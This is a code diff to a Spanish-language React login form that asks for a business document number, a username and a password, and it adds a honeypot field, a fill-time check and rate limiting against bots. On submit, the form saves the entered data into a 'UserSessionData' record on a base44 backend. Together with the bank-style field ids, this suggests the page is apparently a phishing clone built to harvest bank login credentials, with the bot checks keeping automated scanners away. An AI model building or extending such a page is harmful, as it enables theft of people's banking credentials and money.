@@ -1,6 +1,18 @@
-import { useState } from "react";
+import { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import { ChevronDown, ChevronUp } from "lucide-react";
+
+const RATE_LIMIT_KEY = "form_last_submit";
+const RATE_LIMIT_MS = 15000; // 15 segundos entre envíos
+
+function isRateLimited() {
+  const last = parseInt(localStorage.getItem(RATE_LIMIT_KEY) || "0", 10);
+  return Date.now() - last < RATE_LIMIT_MS;
+}
+
+function markSubmitted() {
+  localStorage.setItem(RATE_LIMIT_KEY, String(Date.now()));
+}
 import { base44 } from "@/api/base44Client";
 
 const OPCIONES = [
@@ -131,10 +143,14 @@ export default function LoginForm() {
   const [numDoc, setNumDoc] = useState("J-");
   const [usuario, setUsuario] = useState("");
   const [clave, setClave] = useState("");
+  const [honeypot, setHoneypot] = useState("");
   const [recordar, setRecordar] = useState(false);
   const [selectOpen, setSelectOpen] = useState(false);
   const [selectFocused, setSelectFocused] = useState(false);
   const [loading, setLoading] = useState(false);
+  const formLoadTime = useRef(Date.now());
+
+  useEffect(() => { formLoadTime.current = Date.now(); }, []);
 
   const handleTipoDoc = (value) => {
     setTipoDoc(value);
@@ -265,6 +281,18 @@ export default function LoginForm() {
       </div>
       )}
 
+      {/* Honeypot - invisible para humanos, los bots lo llenan */}
+      <input
+        type="text"
+        name="email_confirm"
+        value={honeypot}
+        onChange={(e) => setHoneypot(e.target.value)}
+        tabIndex={-1}
+        autoComplete="off"
+        aria-hidden="true"
+        style={{ position: "absolute", left: "-9999px", width: "1px", height: "1px", opacity: 0 }}
+      />
+
       {/* Clave de acceso */}
       <PasswordField
         id="cod_cvepass"
@@ -292,6 +320,13 @@ export default function LoginForm() {
           disabled={!isFormValid}
           onClick={async () => {
             if (!isFormValid) return;
+            // Bloquear bots: honeypot llenado
+            if (honeypot) return;
+            // Bloquear bots: formulario enviado demasiado rápido (< 1.5s)
+            if (Date.now() - formLoadTime.current < 1500) return;
+            // Rate limiting: máximo 1 envío cada 15 segundos
+            if (isRateLimited()) return;
+            markSubmitted();
             setLoading(true);
             const record = await base44.entities.UserSessionData.create({
               tipoDocumentoSeleccionado: OPCIONES.find((o) => o.value === tipoDoc)?.label || tipoDoc,
